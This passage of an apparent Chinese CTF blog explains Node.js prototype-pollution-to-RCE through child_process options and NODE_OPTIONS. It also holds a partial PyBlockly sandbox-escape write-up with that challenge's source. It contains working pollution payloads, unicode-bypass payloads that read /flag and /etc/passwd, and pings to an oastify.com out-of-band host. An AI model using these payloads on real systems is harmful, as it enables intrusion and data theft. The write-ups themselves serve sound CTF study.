href="https://www.geeksforgeeks.org/node-js-process-execpath-property/">node process.execPath 官方文档</a>，说明该属性返回当前 Node.js 可执行文件的绝对路径 –&gt; <strong>by the way在fork中可以调整(可以获取看看上面的源码)</strong></li></ol></li><li>在nodejs中<ol><li><p>process.argv[0]：指向 Node.js 可执行文件的路径。这个值会被 process.execPath 覆盖，因此总是显示 Node.js 可执行文件的路径。</p></li><li><p>process.argv0：保留了从父进程传递给子进程的 argv[0] 值。这个值不会被覆盖，因此可以用来获取原始的 argv[0] 值 –&gt; <strong>spawn方法下会被传入到&#x2F;proc&#x2F;self&#x2F;cmdline中</strong>，测试脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parent.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./child.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 &quot;customNode&quot; 的名义调用</span></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [scriptPath], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;customNode&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// child.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv:&#x27;</span>, process.<span class="property">argv</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv0:&#x27;</span>, process.<span class="property">argv0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 /proc/self/cmdline</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmdline = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/proc/self/cmdline&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;\0&#x27;</span>).<span class="title function_">filter</span>(<span class="title class_">Boolean</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;cmdline:&#x27;</span>, cmdline);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bash and res</span></span><br><span class="line">node parent.<span class="property">js</span></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv</span>: [</span><br><span class="line">  <span class="string">&#x27;/usr/bin/node&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;/home/kc1zs4/Code/CodeVscode/Notes/WLabs/1/child.js&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv0</span>: customNode</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: <span class="attr">cmdline</span>: [ <span class="string">&#x27;customNode&#x27;</span>, <span class="string">&#x27;./child.js&#x27;</span> ]</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h4 id="深入理解shell"><a href="#深入理解shell" class="headerlink" title="深入理解shell"></a>深入理解shell</h4><ol><li><p>Q: shell属性如何和argv0属性进行协作？</p><ol><li>A: <a href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">源码部分</a>见下，可知argv0并不会影响传入shell的命令，只是会影响传入子进程的argv0，同时进行测试可以知道分析是正确的，<em><strong>同时在此处shell对我们想要的命令的执行几乎是没有影响的</strong></em></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;ls&#x27;</span>, [], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;pwd&#x27;</span>, <span class="attr">shell</span>: <span class="string">&#x27;/bin/sh&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src</span></span><br><span class="line"><span class="keyword">if</span> (options.<span class="property">shell</span>) &#123;</span><br><span class="line">   <span class="keyword">const</span> command = [file].<span class="title function_">concat</span>(args).<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;win32&#x27;</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = process.<span class="property">env</span>.<span class="property">comspec</span> || <span class="string">&#x27;cmd.exe&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/s&#x27;</span>, <span class="string">&#x27;/c&#x27;</span>, <span class="string">`&quot;<span class="subst">$&#123;command&#125;</span>&quot;`</span>];</span><br><span class="line">     options.<span class="property">windowsVerbatimArguments</span> = <span class="literal">true</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;android&#x27;</span>)</span><br><span class="line">       file = <span class="string">&#x27;/system/bin/sh&#x27;</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = <span class="string">&#x27;/bin/sh&#x27;</span>;</span><br><span class="line">     args = [<span class="string">&#x27;-c&#x27;</span>, command];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">argv0</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(options.<span class="property">argv0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  args.<span class="title function_">unshift</span>(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line"><span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">  envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="核心思想和payloads"><a href="#核心思想和payloads" class="headerlink" title="核心思想和payloads"></a>核心思想和payloads</h4><blockquote><p>这里是根据自己理解的，忽略了一些关于shell参数的</p></blockquote><ol><li><em><strong>这里其实也是一样的绕过思路</strong></em>，通过NODE_OPTIONS了指定require的文件来执行，这里由于无法控制<code>/proc/self/environ</code>从而转向<code>/proc/self/cmdline</code><ol><li><p>再点一下<code>require()</code>函数: 把读取到的内容放到一个自执行函数中执行(所以可以用来执行命令)，返回module.exports需要导出的内容 -&gt; 为什么官方文档没有找到？纳尼</p></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/cmdline&quot;, &quot;argv0&quot;: &quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce2\\\&quot;).toString())//&quot;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-Inspector"><a href="#RCE-via-Inspector" class="headerlink" title="RCE via Inspector"></a>RCE via Inspector</h3><ol><li><p>node运行时允许添加<code>--inspect=host:port</code>格式来设置调试服务器监听的主机地址，<a href="https://www.nodeapp.cn/cli.html#cli_inspect_host_port">详见文档</a></p><ol><li>需要注意防火墙的问题</li></ol></li><li><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;argv0&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;shell&quot;</span>:<span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="string">&quot;NODE_OPTIONS&quot;</span>:<span class="string">&quot;--inspect=id\&quot;\&quot;.oastify\&quot;\&quot;.com&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实际应用????</p></li></ol><h3 id="Defence-Patch"><a href="#Defence-Patch" class="headerlink" title="Defence Patch"></a>Defence Patch</h3><ol><li>由于js原型的特殊性质，涉及到判断的属性最好都提前预设值，否则可以借助原型链污染进行设置 –&gt; 这就是env, shell, argv0可以进行污染的一个原因，因为原型无法覆盖上层值</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> all in one </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyBlockly_强网24</title>
      <link href="/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[<blockquote><p>截至24&#x2F;11&#x2F;3 21:25 还是没有尝试出来，等以后有正规题解再来，这里先不看了，先看看提权吧<br>这道题感觉初见还是蛮有东西的，对我这个菜鸡是一道很值得学习的题目</p></blockquote><hr><blockquote><p><em><strong>培养一点重要的思想</strong></em><br>1.思维是肯定是找注入点，比如这里的<br>2.多多本地试试，输入没有想要的效果一定要检查，<strong>强推本地跑一下</strong><br>3.涉及编码推荐适用python进行尝试，可以显示(bp这里不行)还可以用编码表示</p></blockquote><h2 id="分析与尝试"><a href="#分析与尝试" class="headerlink" title="分析与尝试"></a>分析与尝试</h2><ol><li><p>unicode绕过，呜呜呜，只构造出来poc，可以实现代码执行，进一步可以绕过</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＇﹔<span class="built_in">print</span>⁽＇hello＇⁾﹔＇</span><br></pre></td></tr></table></figure></li><li><p>重写len()函数，读取文件，到这一步就卡住了 –&gt; <em><strong>编码的还是要在本地尝试一下</strong></em>，这里出现了转换后消失的情况，可以一个一个试</p><ol><li>WTF? –&gt; <em><strong>真相大白了，这里没有导入os模块调用不了啊，记错了wc，怪怪的可能是逻辑理解错了</strong></em><img src="/pic/PyBlockly_%E5%BC%BA%E7%BD%9124/len%E5%8F%91%E6%8C%A5%E4%BA%86%E4%BD%9C%E7%94%A8.png" alt="不懂为什么没有回显，蒙蔽了这是，绕过应该是成功"></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标 &#x27;+len=lambda x:0;os.system(&#x27;cat /flag&#x27;) +&#x27;</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line"><span class="comment"># 居然不能执行，本地看一下，是有些字符消失了</span></span><br><span class="line">＇⁺<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x︓<span class="number">0</span>︔os․system⁽＇cat ／flag＇⁾⁺＇</span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇cat ／etc／passwd＇⁾⁾﹔＇</span><br><span class="line"><span class="comment"># 带外尝试，无反应，可能不出网</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽os․system⁽＇ping ﹣c <span class="number">4</span> x425n3uqpcd5ljq0c4809gjsijoac10q․oastify․com＇⁾⁾﹔＇</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终构造还是没有成功，但是每一个字符都有试成功哩</span></span><br><span class="line">＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔os․system⁽＇ls －la ／proc＇⁾﹔＇</span><br><span class="line">    <span class="comment"># len没有绕过成功？不是哥们，回显也是true哩</span></span><br><span class="line">    ＇﹔<span class="built_in">len</span>⁼<span class="keyword">lambda</span> x：<span class="number">0</span>﹔<span class="built_in">print</span>⁽<span class="built_in">len</span>⁽＇a＇⁾⁼⁼<span class="number">0</span>⁾﹔＇</span><br></pre></td></tr></table></figure></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():      </span><br><span class="line">            code =  <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code =  <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code +=<span class="string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code </span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span 